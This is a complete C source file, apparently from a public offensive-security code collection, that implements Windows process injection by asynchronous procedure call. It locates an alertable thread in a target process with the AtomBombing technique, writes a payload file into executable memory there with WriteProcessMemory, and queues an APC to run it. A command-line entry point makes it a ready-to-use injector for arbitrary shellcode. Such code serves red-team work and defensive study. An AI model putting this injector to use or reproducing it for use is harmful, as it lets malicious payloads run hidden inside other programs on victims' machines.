/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

// Try to find thread in alertable state for opened process.
// This is based on code used in AtomBombing technique.
//
// https://github.com/BreakingMalwareResearch/atom-bombing
//
HANDLE find_alertable_thread(HANDLE hp, DWORD pid) {
    DWORD         i, cnt = 0;
    HANDLE        evt[2], ss, ht, h = NULL, 
      hl[MAXIMUM_WAIT_OBJECTS],
      sh[MAXIMUM_WAIT_OBJECTS],
      th[MAXIMUM_WAIT_OBJECTS];
    THREADENTRY32 te;
    MODULEENTRY32 me;
    HMODULE       m;
    LPVOID        f, rm;

    // 1. Create a snapshot of threads + modules
    ss = CreateToolhelp32Snapshot(
      TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE, 
      0);
      
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    // 2. Gather list of threads for target process
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        // otherwise, add to list
        hl[cnt++] = ht;
        // if we've reached MAXIMUM_WAIT_OBJECTS. break
        if(cnt == MAXIMUM_WAIT_OBJECTS) break;
      } while(Thread32Next(ss, &te));
    }

    // 3. Resolve the address of SetEvent in target process
    m = GetModuleHandle(L"kernel32");
    f = GetProcAddress(m, "SetEvent");
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID != pid) continue;
        if(!lstrcmp(me.szModule, L"kernel32.dll")) {
          f = ((LPBYTE)f - (LPBYTE)m) + me.modBaseAddr;
          break;
        }
      } while(Module32Next(ss, &me));
    }

    // 4. For each thread, create an event handle in target process
    for(i=0; i<cnt; i++) {
      // create an event
      sh[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
      // duplicate event handle in target process
      DuplicateHandle(
        GetCurrentProcess(), 
        sh[i], 
        hp, 
        &th[i], 
        0, 
        FALSE, 
        DUPLICATE_SAME_ACCESS);
      // 5. Queue APC for thread
      QueueUserAPC(f, hl[i], (ULONG_PTR)th[i]);
    }

    // 6. Wait for event to become signalled
    i = WaitForMultipleObjects(cnt, sh, FALSE, 1000);
    if(i != WAIT_TIMEOUT) {
      h = hl[i];
    }
    
    // 7. Close source + target handles
    for(i=0; i<cnt; i++) {
      CloseHandle(sh[i]);
      CloseHandle(th[i]);
      if(hl[i] != h) CloseHandle(hl[i]);
    }
    CloseHandle(ss);
    return h;
}

VOID apc_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
    HANDLE hp, ht;
    SIZE_T wr;
    LPVOID cs;
    
    // 1. Open target process
    hp = OpenProcess(
      PROCESS_DUP_HANDLE | 
      PROCESS_VM_WRITE   | 
      PROCESS_VM_OPERATION, 
      FALSE, pid);
      
    if(hp == NULL) return;
    
    // 2. Find an alertable thread
    ht = find_alertable_thread(hp, pid);
    
    if(ht != NULL) {
      // 3. Allocate memory
      cs = VirtualAllocEx(
        hp, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        // 4. Write code to memory
        if(WriteProcessMemory(
          hp, 
          cs, 
          payload, 
          payloadSize, 
          &wr)) 
        {
          // 5. Run code
          QueueUserAPC(cs, ht, 0);
        }
        // 6. Free memory
        VirtualFreeEx(
          hp, 
          cs, 
          0, 
          MEM_DECOMMIT | MEM_RELEASE);
      }
    }
    // 7. Close process
    CloseHandle(hp);
}

int main(void) {
    LPVOID  pic;
    DWORD   len, pid;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 3) {
      printf("\nusage: apc_inject <payload.bin> <process>\n");
      return 0;
    }

    len=readpic(argv[1], &pic);
    if (len==0) { printf("\ninvalid payload\n"); return 0;}
    
    pid = name2pid(argv[2]);
    if(pid==0) pid = wcstoull(argv[2], NULL, 10);
    if(pid==0) { 
      printf("unable to obtain process id for %ws\n", argv[2]);
      return 0;
    }
    
    apc_inject(pid, pic, len);
    return 0;
}

